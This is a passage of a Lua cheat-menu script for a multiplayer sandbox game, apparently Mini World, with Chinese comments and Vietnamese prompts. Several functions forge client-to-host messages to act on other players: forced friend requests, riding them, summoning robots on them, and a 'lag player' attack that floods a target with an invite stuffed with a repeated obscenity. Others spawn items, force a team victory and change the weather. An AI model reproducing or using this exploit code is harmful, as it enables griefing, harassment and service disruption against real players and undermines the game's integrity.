        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function czjy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    -- 中型监狱尺寸
    local width = 15      -- X轴方向宽度
    local height = 8      -- Y轴方向高度
    local depth = 15      -- Z轴方向深度
    
    local start_x = base_x + 5   -- 从玩家位置稍微偏移
    local start_y = base_y       -- 从玩家脚下开始
    local start_z = base_z - 8   -- 向后偏移
    
    print("开始创建中型露天监狱（15x8x15）")
    
    -- 创建四周墙壁和地板
    for dx = 0, width - 1 do
        for dy = 0, height - 1 do
            for dz = 0, depth - 1 do
                
                -- 墙壁或地板（不包括顶部）
                local isWall = (dx == 0 or dx == width - 1 or    -- 前后墙
                               dz == 0 or dz == depth - 1 or    -- 左右墙
                               dy == 0)                          -- 地板
                
                if isWall and dy < height - 1 then  -- 排除顶部
                    local current_x = start_x + dx
                    local current_y = start_y + dy
                    local current_z = start_z + dz
                    
                    local tdata = {
                        [1] = "block",
                        [2] = "placeBlock",
                        [3] = { 1, current_x, current_y, current_z, 0, -1 }
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
            end
        end
    end
    
    -- 放置顶部空气方块
    local top_y = start_y + height - 1
    for dx = 0, width - 1 do
        for dz = 0, depth - 1 do
            local current_x = start_x + dx
            local current_z = start_z + dz
            
            local air_data = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { 1001, current_x, top_y, current_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, air_data)
        end
    end
    
    -- 创建入口（正面中间）
    local doorX = start_x + math.floor(width / 2)
    local doorY = start_y + 1
    local doorZ = start_z
    
    print("中型露天监狱创建完成！")
    print("- 尺寸：宽15 x 高8 x 深15")
    print("- 入口位置：X="..doorX..", Y="..doorY..", Z="..doorZ)
end
                   



-- ==================== 基础功能 ====================
function czhh()
-- 生成五层巨型花环（每层明显分开）

    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local center_x, center_y, center_z = x / 100, y / 100, z / 100
    
    -- 五层鲜花ID
    local flowerIds = {200398, 200405, 200417, 200398, 200405,200398,200405,200417,200398,200417,200405}
    
    -- 五层半径：15, 30, 45, 60, 75米（稍微拉大间距）
    local radius = {5.0,10.0,15.0,20.0,25.0, 30.0,35.0,40.0, 45.0, 60.0, 75.0}
    
    -- 五层花朵数量（按周长比例增加）
    local flowerCount = {
    math.floor(2 * math.pi * 5 * 0.8),   -- 约75朵
    math.floor(2 * math.pi * 10 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 15 * 0.8), 
        math.floor(2 * math.pi * 20 * 0.8),   -- 约75朵  
        math.floor(2 * math.pi * 25 * 0.8),   -- 约75朵
        
        math.floor(2 * math.pi * 30 * 0.8),   -- 约150朵
        math.floor(2 * math.pi * 35 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 40 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 45 * 0.8),   -- 约226朵
        math.floor(2 * math.pi * 60 * 0.8),   -- 约301朵
        math.floor(2 * math.pi * 75 * 0.8)    -- 约377朵
    }
    
    ShowGameTipsWithoutFilter("#c00ff00Bắt đầu tạo vòng hoa khổng lồ 11 tầng")
    ShowGameTipsWithoutFilter("#c00ff00Tổng số hoa khoảng" .. (flowerCount[1]+flowerCount[2]+flowerCount[3]+flowerCount[4]+flowerCount[5]+flowerCount[6]+flowerCount[7]+flowerCount[8]+flowerCount[9]+flowerCount[10]+flowerCount[11]) .. " bông")
    
    -- 地面基础高度
    local ground_y = center_y + 0.2
    
    for layer = 1, 11 do
        local currentFlowerId = flowerIds[layer]
        local currentRadius = radius[layer]
        local currentCount = flowerCount[layer]
        
        ShowGameTipsWithoutFilter("#cFFAA00Đang tạo tầng " .. layer .. ", bán kính" .. currentRadius .. " mét, khoảng cách" .. (radius[layer] - (radius[layer-1] or 0)) .. " mét")
        
        for i = 1, currentCount do
            -- 均匀分布角度
            local angle = (i - 1) * (2 * math.pi / currentCount)
            
            -- 稍微加一点随机偏移，让花环更自然（但不影响层间距）
            local rand_angle = (math.random() - 0.5) * 0.1
            local rand_radius = (math.random() - 0.5) * 0.3
            local final_angle = angle + rand_angle
            local final_radius = currentRadius + rand_radius
            
            -- 计算坐标
            local offset_x = math.cos(final_angle) * final_radius
            local offset_z = math.sin(final_angle) * final_radius
            
            local flower_x = center_x + offset_x
            local flower_z = center_z + offset_z
            
            -- 所有花都种在地上
            local tdata = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { currentFlowerId, flower_x, ground_y, flower_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            
            threadpool:wait(0.003)
        end
        
        threadpool:wait(0.1)
    end
    

end

function zdhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Ép kết bạn")
end


function jxfk()
for a = 0, 100000 do
        threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end


function qxwj()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cưỡi lên người chơi")
end


function Fxms(aa)
    threadpool:work(function()
        if ClientCurGame:isInGame() then
            threadpool:wait(0.01)
            CurMainPlayer:setFlying(aa)
        else
            ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
        end
    end)
end

function ydfh(aa)
    if CurWorld and CurMainPlayer then
        trigger()
        local HP = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
        if HP < 0 then
            ClientCurGame:getMainPlayer():revive(1)
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { AccountManager:getUin(), 520, 23 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function ydfh_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    ydfh_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadChưa vào bản đồ, bật thất bại")
                break
            end
            ydfh(aa)
            threadpool:wait(0.01)
            if not ydfh_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end

function wdtz(aa)
    CurMainPlayer:tryShapeShift(80)
    CurMainPlayer:jumpOnce()
end

function wdtz_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    wdtz_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
                break
            end
            wdtz(aa)
            threadpool:wait(0.1)
            if not wdtz_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end

function rwdx()
    if ClientCurGame:isInGame() then
        local player = CurMainPlayer
        player:setCustomScale(4)
        player:syncCustomScale()
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function rwtx()
    if ClientCurGame:isInGame() then
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function rwjs_speed()
    if ClientCurGame:isInGame() then
        GameVM.Creature:setWalkSpeed(AccountManager:getUin(), 100)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function zhjqr()
    if ClientCurGame:isInGame() then
        local content = { summonid = "4901", objid = AccountManager:getUin() }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function zdjqr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local content = { summonid = "4901", objid = uin }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
    end, "Chỉ định robot")
end

function zdkr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#RCấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("#RCấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local content = {
            msg = "transfer_invited",
            inviterUin = AccountManager:getUin(),
            inviterName = "\n\n\n\n\n#RĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ màyĐịt mẹ mày",
            beInvitedUin = uin
        }
        SandboxLuaMsg.sendToHost("TELEPORT_SEND_INVITE_TOHOST", content)
    end, "Chỉ định làm lag người chơi")
end

function tjzd()
    if ClientCurGame:isInGame() then
        local content = { role_id = AccountManager:getUin(), itemid = 15056, itemnum = 999 }
        SandboxLuaMsg.sendToHost("DEVELOPERSTORE_EXTRASTOREITEM_TOHOST", content)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function jjzd()
    if ClientCurGame:isInGame() then
        BanItem(15056)
        getglobal("MItemTipsFrame"):Hide()
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function gbfj()
    if ClientCurGame:isInGame() then
        local tdata = { teamid = 1, result = 1 }
        ScriptSupportTask:reportTaskToHost(SSTASKID.TEAM_RESULTS, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function gbtq()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "gamerule",
            [2] = "setWeather",
            [3] = { 5 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end


function dtly()
-- 获取玩家当前位置作为中心点
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x, center_y, center_z = x / 100, y / 100, z / 100

-- 球体半径
local radius = 10

-- 外层岩浆半径（比球体大2格）
local outer_radius = radius + 2

-- 最外层空气墙半径（比岩浆大3格）
local airwall_radius = outer_radius + 3


-- 第一步：生成内层空心球体（1221）
for ix = -radius, radius do
    for iy = -radius, radius do
        for iz = -radius, radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= radius - 0.5 and dist <= radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1221, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第二步：生成中层岩浆包裹层（5）
for ix = -outer_radius, outer_radius do
    for iy = -outer_radius, outer_radius do
        for iz = -outer_radius, outer_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= outer_radius - 0.5 and dist <= outer_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 5, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第三步：生成最外层空气墙（1001）
for ix = -airwall_radius, airwall_radius do
    for iy = -airwall_radius, airwall_radius do
        for iz = -airwall_radius, airwall_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= airwall_radius - 0.5 and dist <= airwall_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1001, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第四步：在单挑领域附近循环播放闪电（增强版）
ShowGameTipsWithoutFilter("#c00ff00Bắt đầu phát sét lặp quanh khu vực...")

threadpool:work(function()
    -- 生成36个闪电位置（球面分布）
    local lightning_positions = {}
    
    -- 生成多圈不同高度的闪电
    for radius_mult = 1, 3 do  -- 3圈不同距离
        local current_radius = airwall_radius + 3 + radius_mult * 2
        
        for angle1 = 0, 360, 30 do  -- 水平方向每30度一个
            for angle2 = -60, 60, 30 do  -- 垂直方向每30度一个
                local rad1 = math.rad(angle1)
                local rad2 = math.rad(angle2)
                
                local px = center_x + current_radius * math.cos(rad1) * math.cos(rad2)
                local py = center_y + current_radius * math.sin(rad2) + 5  -- 抬高5米
                local pz = center_z + current_radius * math.sin(rad1) * math.cos(rad2)
                
                table.insert(lightning_positions, {x = px, y = py, z = pz})
            end
        end
    end
    
    -- 添加一些随机位置的闪电
    for i = 1, 20 do
        local random_angle = math.random(0, 360)
        local random_height = math.random(-10, 20)
